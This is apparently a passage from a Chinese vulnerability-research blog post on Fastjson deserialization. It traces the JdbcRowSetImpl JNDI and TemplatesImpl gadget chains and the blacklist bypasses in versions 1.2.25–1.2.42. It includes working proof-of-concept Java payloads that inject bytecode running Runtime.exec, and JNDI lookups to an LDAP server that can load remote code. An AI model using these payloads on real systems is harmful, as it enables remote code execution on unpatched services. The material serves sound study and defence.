title="省流"></a>省流</h3><ul><li>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class时，会调用反序列化得到的类的构造函数、所有属性的getter方法、JSON里面的非私有属性的setter方法，其中properties属性的getter方法会被调用两次；</li><li>当反序列化为<code>JSON.parseObject(*,*.class)</code>形式即指定class时，只调用反序列化得到的类的构造函数、JSON里面的非私有属性的setter方法、properties属性的getter方法；</li><li>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class进行反序列化时得到的都是JSONObject类对象，而只要指定了class即<code>JSON.parseObject(*,*.class)</code>形式得到的都是特定的Student类；</li><li>存在无参构造方法：使用无参构造方法创建对象，并通过反射设置属性值</li><li>不存在无参构造方法，但存在有参构造方法：尝试根据 JSON 字符串的属性名称查找相应的构造方法参数，并通过反射调用有参构造方法创建对象，并设置属性值。</li></ul><p><strong>setter自动调用需要满足以下条件</strong>：</p><ul><li><p>方法名长度大于4</p></li><li><p>非静态方法</p></li><li><p>返回值为void或者当前类</p></li><li><p>以set开头且第四个字母为大写</p></li><li><p>参数个数为1个</p></li></ul><p><strong>getter自动调用还需要满足以下条件</strong>：</p><ul><li>方法名长度大于4</li><li>必须是 public 修饰</li><li>非静态方法</li><li>以get开头且第四个字母为大写</li><li>无参数传入</li><li>返回值类型继承自Collection || Map || AtomicBoolean || AtomicInteger || AtomicLong</li><li>此getter不能有setter方法（程序会先将目标类中所有的setter加入fieldList列表，因此可以通过读取fieldList列表来判断此类中的getter方法有没有setter）</li></ul><p>除此之外Fastjson还有以下功能点：</p><ol><li>如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用<code>Feature.SupportNonPublicField</code>参数</li><li>fastjson 在为类属性寻找getter&#x2F;setter方法时，调用函数<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code>方法，会忽略<code>_</code>和<code>-</code>字符串</li><li>fastjson 在反序列化时，如果Field类型为byte[]，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code>进行base64解码，在序列化时也会进行base64编码</li></ol><p><strong>$ref</strong></p><p>当fastjson版本&gt;&#x3D;1.2.36时，我们可以使用<code>$ref</code>的方式来调用任意的getter</p><table><thead><tr><th>语法</th><th>描述</th></tr></thead><tbody><tr><td>{“$ref”:”$”}</td><td>引用根对象</td></tr><tr><td>{“$ref”:”@”}</td><td>引用自己</td></tr><tr><td>{“$ref”:”..”}</td><td>引用父对象</td></tr><tr><td>{“$ref”:”..&#x2F;..”}</td><td>引用父对象的父对象</td></tr><tr><td>{“$ref”:”$.members[0].reportTo”}</td><td>基于路径的引用</td></tr></tbody></table><p><strong>补充：</strong></p><p>在给setter方法设置传入的参数的时候key是根据setter的名字决定的，例如</p><pre><code class="java">public void setName(String val) &#123;        System.out.println(&quot;调用setName&quot;);        this.n = val;    &#125;</code></pre><p>如果调用setName的时候设置传入的参数val的值，key的名称只能是name&#x2F;Name ,就是函数名去除掉set&#x2F;get剩余的部分</p><pre><code class="java">&#123;&quot;Name&quot;:&quot;xxxxx&quot;&#125;或者&#123;&quot;name&quot;:&quot;xxxxx&quot;&#125;</code></pre><p>不能这样</p><pre><code class="java">&#123;&quot;n&quot;:&quot;xxxxx&quot;&#125;或者&#123;&quot;val&quot;:&quot;xxxxx&quot;&#125;</code></pre><p> <strong>反序列化的时候调用的构造函数是无参构造函数</strong></p><h2 id="Fastjson-lt-x3D-1-2-24"><a href="#Fastjson-lt-x3D-1-2-24" class="headerlink" title="Fastjson&lt;&#x3D;1.2.24"></a>Fastjson&lt;&#x3D;1.2.24</h2><p>1.2.24版本是第一个被暴露出漏洞的版本</p><h3 id="JNDI利用链"><a href="#JNDI利用链" class="headerlink" title="JNDI利用链"></a>JNDI利用链</h3><p>根据fastjson的特性找到可利用的类，这里的利用类是<code>com.sun.rowset.JdbcRowSetImpl</code></p><p>在这个类中，利用点在connect方法里</p><pre><code class="java">private Connection connect() throws SQLException &#123;        if (this.conn != null) &#123;            return this.conn;        &#125; else if (this.getDataSourceName() != null) &#123;            try &#123;                InitialContext var1 = new InitialContext();                DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());                return this.getUsername() != null &amp;&amp; !this.getUsername().equals(&quot;&quot;) ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();            &#125; catch (NamingException var3) &#123;                throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());            &#125;        &#125; else &#123;            return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;        &#125;    &#125;</code></pre><p>这里可以看到new InitialContext()和lookup()方法，如果this.getDataSourceName()可控，这不就JDNI注入了吗</p><p>根进<code>this.getDataSourceName()</code>,这里是调用了父类的getDataSourceName方法</p><pre><code class="java">public String getDataSourceName() &#123;        return dataSource;    &#125;</code></pre><p>下面是对应的setter方法</p><pre><code class="java">public void setDataSourceName(String name) throws SQLException &#123;        if (name == null) &#123;            dataSource = null;        &#125; else if (name.equals(&quot;&quot;)) &#123;           throw new SQLException(&quot;DataSource name cannot be empty string&quot;);        &#125; else &#123;           dataSource = name;        &#125;        URL = null;    &#125;</code></pre><p>所以只有构造如下，即可调用这个setter方法给<code>dataSource</code>赋值</p><pre><code class="java">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://0.0.0.0:1389/Basic/Command/calc&quot;&#125;</code></pre><p>然后调用connect方法的时候就会调用getDataSourceName()获取到dataSource的内容</p><p>下一步就是如何调用<code>connect方法</code></p><p>通过查找，在这个类下找到两个，第一个是<code>getDatabaseMetaData</code></p><pre><code class="java">public DatabaseMetaData getDatabaseMetaData() throws SQLException &#123;        Connection var1 = this.connect();        return var1.getMetaData();    &#125;</code></pre><p>如果反序列化调用了这个getter方法，就会调用connect()，但是反序列化过程不会调用这个方法，因为这个方法的返回值是DatabaseMetaData,不满足返回值类型继承自Collection || Map || AtomicBoolean || AtomicInteger || AtomicLong</p><p>如果要调用这个get方法，只能通过parseObject方法里面的<code>JSON.toJSON</code> ，但是要确保parse()不报错（这很难）</p><p>然后找下一个</p><pre><code class="java">public void setAutoCommit(boolean var1) throws SQLException &#123;        if (this.conn != null) &#123;            this.conn.setAutoCommit(var1);        &#125; else &#123;            this.conn = this.connect();            this.conn.setAutoCommit(var1);        &#125;    &#125;</code></pre><p>因为反序列化的时候调用无参构造函数的时候，this.conn&#x3D;null,所以这里会进入else分支调用connect</p><p>综上所述，POC构造如下</p><pre><code class="java">String jsonstr3 = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;,\&quot;AutoCommit\&quot;:true&#125;&quot;;JSON.parse(jsonstr3);//或者JSON.parseObject(jsonstr3)</code></pre><p><strong>注意</strong>：</p><p>因为这个是存在一个调用顺序的，反序列化的过程中，先调用满足条件的setter方法，根据这个字符串从左往右依次执行，例如这个，先调用setDatabaseMetaData(),  然后再调用setAutoCommit,刚刚好先赋值再执行</p><p>所以将顺序调换是用不了的</p><pre><code class="java">&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;AutoCommit\&quot;:true,\&quot;dataSourceName\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;&#125;</code></pre><p>如果是getter方法的话，就是先getAutoCommit()再getDatabaseMetaData()刚好反过来，顺序是从右往左</p><h3 id="TemplatesImpl-利用链"><a href="#TemplatesImpl-利用链" class="headerlink" title="TemplatesImpl 利用链"></a>TemplatesImpl 利用链</h3><p>javassist：</p><pre><code class="xml">&lt;dependency&gt;      &lt;groupId&gt;org.javassist&lt;/groupId&gt;      &lt;artifactId&gt;javassist&lt;/artifactId&gt;      &lt;version&gt;3.22.0-GA&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>这里利用的是下面这个类：</p><pre><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></pre><p>和CC2这条链的利用差不多,还是这个<code>defineTransletClasses</code>方法</p><pre><code class="java">private void defineTransletClasses()        throws TransformerConfigurationException &#123;        if (_bytecodes == null) &#123;            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);            throw new TransformerConfigurationException(err.toString());        &#125;        TransletClassLoader loader = (TransletClassLoader)            AccessController.doPrivileged(new PrivilegedAction() &#123;                public Object run() &#123;                    return new TransletClassLoader(ObjectFactory.findClassLoader());                &#125;            &#125;);        try &#123;            final int classCount = _bytecodes.length;            _class = new Class[classCount];            if (classCount &gt; 1) &#123;                _auxClasses = new Hashtable();            &#125;            for (int i = 0; i &lt; classCount; i++) &#123;                _class[i] = loader.defineClass(_bytecodes[i]);                final Class superClass = _class[i].getSuperclass();                // Check if this is the main class                if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;                    _transletIndex = i;                &#125;                else &#123;                    _auxClasses.put(_class[i].getName(), _class[i]);                &#125;            &#125;            if (_transletIndex &lt; 0) &#123;                ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);                throw new TransformerConfigurationException(err.toString());            &#125;        &#125;        catch (ClassFormatError e) &#123;            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);            throw new TransformerConfigurationException(err.toString());        &#125;        catch (LinkageError e) &#123;            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);            throw new TransformerConfigurationException(err.toString());        &#125;    &#125;</code></pre><p>这个方法会创建一个长度为<code>_bytecodes.length</code>的数组<code>_class</code>，然后循环遍历每个转换类的字节码，并通过<code>loader.defineClass(_bytecodes[i])</code>方法将字节码转换为实际的<code>Class</code>对象，如果<code>_bytecodes</code>保存的是恶意的字节码，那这里就可以获得一个恶意的Class对象了</p><p>这个恶意类必须继承<code>AbstractTranslet</code>，因为：</p><pre><code class="java">//private static String ABSTRACT_TRANSLET        = &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;                    _transletIndex = i;                &#125;</code></pre><p>如何获取恶意的字节码？</p><p>使用javassist来构造</p><pre><code class="java">ClassPool pool = ClassPool.getDefault();CtClass Evil = pool.makeClass(&quot;Evil&quot;);Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));String name = &quot;Evil&quot;;Evil.setName(name);String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;CtConstructor constructor = Evil.makeClassInitializer();constructor.insertBefore(cmd);byte[] bytes =Evil.toBytecode();</code></pre><p>下一步考虑_bytecodes如何赋值</p><pre><code class="java">private synchronized void setTransletBytecodes(byte[][] bytecodes) &#123;        _bytecodes = bytecodes;    &#125;</code></pre><p>这个setter方法可以给<code>_bytecodes</code>赋值的但是它是<code>private</code>修饰的,反序列化时不会调用,找遍了setter和getter方法也没有找到一个可以让<code>_bytecodes</code>赋值的地方</p><p><strong>如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用<code>Feature.SupportNonPublicField</code>参数</strong></p><pre><code class="java">JSON.parse(payload, Feature.SupportNonPublicField);或JSON.parseObject(payload, Feature.SupportNonPublicField);</code></pre><p>所以构造payload如下：</p><pre><code class="java">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;_bytecodes\&quot;]&#125;&quot;</code></pre><p>下一步就是要想如何调用defineTransletClasses()</p><p>按照CC2的利用链是找到了getTransletInstance()这个方法</p><pre><code class="java">private Translet getTransletInstance()        throws TransformerConfigurationException &#123;        try &#123;            if (_name == null) return null;            if (_class == null) defineTransletClasses();            // The translet needs to keep a reference to all its auxiliary            // class to prevent the GC from collecting them            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();            translet.postInitialization();            translet.setTemplates(this);            translet.setServicesMechnism(_useServicesMechanism);            translet.setAllowedProtocols(_accessExternalStylesheet);            if (_auxClasses != null) &#123;                translet.setAuxiliaryClasses(_auxClasses);            &#125;            return translet;        &#125;        catch (InstantiationException e) &#123;            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);            throw new TransformerConfigurationException(err.toString());        &#125;        catch (IllegalAccessException e) &#123;            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);            throw new TransformerConfigurationException(err.toString());        &#125;    &#125;</code></pre><p>这个方法刚好可以运行<code>defineTransletClasses</code>后调用了newInstance()对_class进行了实例化，只要控制<code>_name</code>不为null即可</p><p>但是这个getter方法不能直接调用，又是private修饰</p><p>继续往上寻找能够调用getTransletInstance的方法</p><p>找到这个newTransformer()</p><pre><code class="java">public synchronized Transformer newTransformer()        throws TransformerConfigurationException    &#123;        TransformerImpl transformer;        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,            _indentNumber, _tfactory);        if (_uriResolver != null) &#123;            transformer.setURIResolver(_uriResolver);        &#125;        if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;            transformer.setSecureProcessing(true);        &#125;        return transformer;    &#125;</code></pre><p>这个方法不上setter或者getter, 继续寻找调用<code>newTransformer</code>方法的地方</p><pre><code class="java">public synchronized Properties getOutputProperties() &#123;        try &#123;            return newTransformer().getOutputProperties();        &#125;        catch (TransformerConfigurationException e) &#123;            return null;        &#125;    &#125;</code></pre><p>这个getter满足自动调用的条件，可以用,  刚好存在<code>_outputProperties</code>属性。Properties类型继承自 <code>Hashtable</code>，所以给个空键值对<code>&#123;&#125;</code> 即可</p><p>payload如下：</p><pre><code class="java">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;_bytecodes\&quot;],\&quot;_outputProperties\&quot;:&#123;&#125;&#125;&quot;</code></pre><p>在结合一下上面提到的条件<code>_name</code>不为null</p><pre><code class="java">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;_bytecodes\&quot;],\&quot;_name\&quot;:\&quot;AA\&quot;,\&quot;_outputProperties\&quot;:&#123;&#125;&#125;&quot;;</code></pre><p>然后运行发现，正常流程都走完了，就是没有运行恶意代码</p><p>调试发现在com.alibaba.fastjson.parser.JSONScanner#bytesValue中，如果Field类型为byte[]，会进行base64解码</p><pre><code class="java">public byte[] bytesValue() &#123;        return IOUtils.decodeBase64(text, np + 1, sp);    &#125;</code></pre><p>所以将生成的_bytecodes进行base64编码即可</p><p>最终POC</p><pre><code class="java">package org.example;import com.alibaba.fastjson.JSON;import java.io.*;import com.alibaba.fastjson.parser.Feature;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.*;import com.alibaba.fastjson.parser.JSONScanner;import java.nio.charset.StandardCharsets;import java.util.Base64;public class App &#123;    public static void main( String[] args ) throws NotFoundException, CannotCompileException, IOException &#123;        //构造恶意类        ClassPool pool = ClassPool.getDefault();        CtClass Evil = pool.makeClass(&quot;Evil&quot;);        Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));        String name = &quot;Evil&quot;;        Evil.setName(name);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;        CtConstructor constructor = Evil.makeClassInitializer();        constructor.insertBefore(cmd);        byte[] bytes =Evil.toBytecode();        byte[] encodedBytes = Base64.getEncoder().encode(bytes);        String base64Code=new String(encodedBytes, StandardCharsets.UTF_8);        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+base64Code+&quot;\&quot;],\&quot;_name\&quot;:\&quot;aa\&quot;,\&quot;_outputProperties\&quot;:&#123;&#125;&#125;&quot;;        JSON.parse(payload, Feature.SupportNonPublicField);//        JSON.parseObject(payload, Feature.SupportNonPublicField);    &#125;&#125;</code></pre><p>因为上面测试的jdk版本为8u41,和高版本的payload不一样</p><p>思想是一样的，只是多控制了个参数</p><p>在高版本的defineTransletClasses中，loader变了 ，这里还需要控制<code>_tfactory</code>不为空</p><pre><code class="java">TransletClassLoader loader = (TransletClassLoader)            AccessController.doPrivileged(new PrivilegedAction() &#123;                public Object run() &#123;                    return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());                &#125;            &#125;);</code></pre><p>所以构造POC:</p><pre><code class="json">&#123;        &quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,        &quot;_bytecodes&quot;:[&quot;base64Code&quot;],        &quot;_name&quot;:&quot;aa&quot;,        &quot;_tfactory&quot;:&#123; &#125;,        &quot;_outputProperties&quot;:&#123;&#125;,        &quot;_version&quot;:&quot;&quot;    &#125;</code></pre><h2 id="Fastjson1-2-25-1-2-41"><a href="#Fastjson1-2-25-1-2-41" class="headerlink" title="Fastjson1.2.25-1.2.41"></a>Fastjson1.2.25-1.2.41</h2><p>条件：开启AutoType</p><p>环境搭建：</p><pre><code class="xml">&lt;dependency&gt;      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;      &lt;artifactId&gt;fastjson&lt;/artifactId&gt;      &lt;version&gt;1.2.25&lt;/version&gt;    &lt;/dependency&gt;</code></pre><p>在这个版本中对前面的版本漏洞进行了修复</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230807151344823.png" alt="image-20230807151344823"></p><p>在此版本中，新增了黑名单和白名单功能<br>在<code>ParserConfig</code>中，可以看到黑名单的内容，而且设置了一个<code>autoTypeSupport</code>用来控制是否可以反序列化，<code>autoTypeSupport</code>默认为<code>false</code>且禁止反序列化，为true时会使用<code>checkAutoType</code>来进行安全检测</p><pre><code class="java">private boolean   autoTypeSupport = AUTO_SUPPORT;private String[]  denyList = &quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;.split(&quot;,&quot;);private String[]   acceptList  = AUTO_TYPE_ACCEPT_LIST;//[]</code></pre><p>可以看上面版本利用的<code>com.sun.</code>在黑名单里面</p><p>在<code>checkAutoType</code>中进行了黑白名单检查,但是调试发现白名单为空</p><pre><code class="java">if (autoTypeSupport || expectClass != null) &#123;            for (int i = 0; i &lt; acceptList.length; ++i) &#123;                String accept = acceptList[i];                if (className.startsWith(accept)) &#123;                    return TypeUtils.loadClass(typeName, defaultClassLoader);                &#125;            &#125;            for (int i = 0; i &lt; denyList.length; ++i) &#123;                String deny = denyList[i];                if (className.startsWith(deny)) &#123;                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);                &#125;            &#125;        &#125;</code></pre><p>首先autoTypeSupport默认为false,如果要修改为true,可以通过服务的添加<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code></p><p>进入上面的判断后，先进行白名单检查，如果找到，则直接返回class，如果没找到，往下进行黑名单检查</p><p>还有</p><p>当autoTypeSupport为false的时候会进入下面的逻辑</p><pre><code class="java">if (!autoTypeSupport) &#123;            for (int i = 0; i &lt; denyList.length; ++i) &#123;                String deny = denyList[i];                if (className.startsWith(deny)) &#123;                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);                &#125;            &#125;            for (int i = 0; i &lt; acceptList.length; ++i) &#123;                String accept = acceptList[i];                if (className.startsWith(accept)) &#123;                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);                    if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;                        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());                    &#125;                    return clazz;                &#125;            &#125;        &#125;</code></pre><p>这里和上面的差不多，但是是先进行黑名单检查，再进行白名单检查</p><p>如果黑白名单里面都没找到，那只能</p><pre><code class="java">if (autoTypeSupport || expectClass != null) &#123;            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);        &#125;</code></pre><p>如果这个if也进不去，返回clazz&#x3D;null</p><h3 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h3><p>无论autoTypeSupport是否为true,都需要经过检查黑白名单，看似只能找到其他的利用类绕过黑名单</p><p>先看看loadClass的逻辑</p><pre><code class="java">public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;        if (className == null || className.length() == 0) &#123;            return null;        &#125;        Class&lt;?&gt; clazz = mappings.get(className);        if (clazz != null) &#123;            return clazz;        &#125;        if (className.charAt(0) == &#39;[&#39;) &#123;//[开头            Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);            return Array.newInstance(componentType, 0).getClass();        &#125;        if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) &#123;//L开头，;结尾            String newClassName = className.substring(1, className.length() - 1);//去除开头和结尾            return loadClass(newClassName, classLoader);        &#125;    .......        &#125;</code></pre><p>很明显的看到这里会对className进行处理，如果className的开头为<code>[</code>，会去掉这个开头再加载</p><p>但是实际上在代码中也可以看见它会返回Array的实例变成数组。在实际中它远远不会执行到这一步，在json串解析时就已经报错。</p><p>如果是L开头，<code>;</code>结尾的，会去除<code>L</code>和<code>;</code> 进行加载，直接返回加载结果</p><p>1.2.24版本的链子是这样的</p><pre><code class="java">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;,\&quot;AutoCommit\&quot;:true&#125;&quot;</code></pre><p>如果将其修改为</p><pre><code class="java">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;,\&quot;AutoCommit\&quot;:true&#125;&quot;</code></pre><p>就可以绕过黑名单中对<code>com.sun</code>的检测了</p><p>但是绕过黑白名单后，还是没法进行loadclass,只剩下</p><pre><code class="java">if (autoTypeSupport || expectClass != null) &#123;            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);        &#125;</code></pre><p>为了能够进入这个if语句，只能在服务段进行修改,添加下面语句：</p><pre><code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code></pre><p>完整POC</p><pre><code class="java">package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;public class App&#123;    public static void main( String[] args ) &#123;        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);        String payload=&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;,\&quot;AutoCommit\&quot;:true&#125;&quot;;        JSON.parseObject(payload);    &#125;&#125;</code></pre><p>同理，TemplatesImpl 利用链也可以利用</p><pre><code class="java">package org.example;import com.alibaba.fastjson.JSON;import java.io.*;import com.alibaba.fastjson.parser.Feature;import com.alibaba.fastjson.parser.ParserConfig;import javassist.*;import java.nio.charset.StandardCharsets;import java.util.Base64;public class App&#123;    public static void main( String[] args ) throws NotFoundException, CannotCompileException, IOException &#123;        //构造恶意类        ClassPool pool = ClassPool.getDefault();        CtClass Evil = pool.makeClass(&quot;Evil&quot;);        Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));        String name = &quot;Evil&quot;;        Evil.setName(name);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;        CtConstructor constructor = Evil.makeClassInitializer();        constructor.insertBefore(cmd);        byte[] bytes =Evil.toBytecode();        byte[] encodedBytes = Base64.getEncoder().encode(bytes);        String base64Code=new String(encodedBytes, StandardCharsets.UTF_8);        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+base64Code+&quot;\&quot;],\&quot;_name\&quot;:\&quot;A\&quot;,\&quot;_tfactory\&quot;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123;&#125;&#125;&quot;;        JSON.parse(payload, Feature.SupportNonPublicField);//        JSON.parseObject(payload, Feature.SupportNonPublicField);    &#125;&#125;</code></pre><h2 id="Fastjson1-2-25-1-2-42"><a href="#Fastjson1-2-25-1-2-42" class="headerlink" title="Fastjson1.2.25-1.2.42"></a>Fastjson1.2.25-1.2.42</h2><p>条件：开启AutoType</p><p>环境搭建</p><pre><code class="java">&lt;dependency&gt;      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;      &lt;artifactId&gt;fastjson&lt;/artifactId&gt;      &lt;version&gt;1.2.42&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>这个版本中对src&#x2F;main&#x2F;java&#x2F;com&#x2F;alibaba&#x2F;fastjson&#x2F;parser&#x2F;ParserConfig.java进行了大量修改，其中最明显的是将黑名单变成了hashcode</p><pre><code class="java">denyHashCodes = new long[]&#123;                -8720046426850100497L,                -8109300701639721088L,                -7966123100503199569L,                -7766605818834748097L,                -6835437086156813536L,                -4082057040235125754L,                -3979025623072794412L,                -2364987994247679115L,                -1872417015366588117L,                -254670111376247151L,                33238344207745342L,                313864100207897507L,                1203232727967308606L,                3547627781654598988L,                3730752432285826863L,                4147696707147271408L,                5450448828334921485L,                5751393439502795295L,                5944107969236155580L,                6742705432718011780L,                7179336928365889465L,                7442624256860549330L,                8838294710098435315L        &#125;;</code></pre><p>从1.2.42版本开始，Fastjson把原本明文形式的黑名单改成了哈希过的黑名单，目的就是为了防止安全研究者对其进行研究，提高漏洞利用门槛，但是有人已在Github上跑出了大部分黑名单包类：<a href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p><h3 id="绕过分析-1"><a href="#绕过分析-1" class="headerlink" title="绕过分析"></a>绕过分析</h3><p>重新审计checkAutoType()方法</p><pre><code class="java">public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;        if (typeName == null) &#123;            return null;        &#125; else if (typeName.length() &lt; 128 &amp;&amp; typeName.length() &gt;= 3) &#123;            String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);            Class&lt;?&gt; clazz = null;            long BASIC = -3750763034362895579L;            long PRIME = 1099511628211L;            if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) &#123;                className = className.substring(1, className.length() - 1);            &#125;</code></pre><p>首先获取@type指定的类的名字，如果存在<code>$</code>，就将其改为<code>.</code></p><p>然后对className的开头结尾进行与hash异或检测，如果满足if的条件就进行“去头去尾”  ，经过测试发现这里就是将<code>L</code>开头的和<code>;</code>结尾的className进行处理</p><p>然后往下</p><pre><code class="java">            long h3 = (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L ^ (long)className.charAt(2)) * 1099511628211L;            long hash;            int i;            if (this.autoTypeSupport || expectClass != null) &#123;                hash = h3;                for(i = 3; i &lt; className.length(); ++i) &#123;                    hash ^= (long)className.charAt(i);                    hash *= 1099511628211L;                    if (Arrays.binarySearch(this.acceptHashCodes, hash) &gt;= 0) &#123;                        clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);                        if (clazz != null) &#123;                            return clazz;                        &#125;                    &#125;                    if (Arrays.binarySearch(this.denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) &#123;                        throw new JSONException(&quot;autoType is not support. &quot; + typeName);                    &#125;                &#125;            &#125;</code></pre><p>这里其实就是进行黑白名单检测，只是变成了hash的样子(估计是为了加大审计难度)，进入这个if也是需要autoTypeSupport&#x3D;&#x3D;true</p><pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code></pre><p>想绕过这里很简单，只需要再套一层<code>L</code>开头的和<code>;</code>结尾即可，</p><pre><code class="java">LLcom.sun.rowset.JdbcRowSetImpl;;</code></pre><p>黑白名单检测前会去除掉一层，</p><pre><code>Lcom.sun.rowset.JdbcRowSetImpl;</code></pre><p>这个就可以绕过黑白名单了</p><p>然后往下继续</p><pre><code class="java">if (clazz == null) &#123;    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);&#125;</code></pre><p>因为clazz &#x3D;&#x3D; null,进入<code>loadClass</code>,此时<code>typeName</code>为</p><pre><code>LLcom.sun.rowset.JdbcRowSetImpl;;</code></pre><p>进入loadClass后</p><pre><code class="java">if (className != null &amp;&amp; className.length() != 0) &#123;    Class&lt;?&gt; clazz = (Class)mappings.get(className);    if (clazz != null) &#123;        return clazz;    &#125; else if (className.charAt(0) == &#39;[&#39;) &#123;        Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);        return 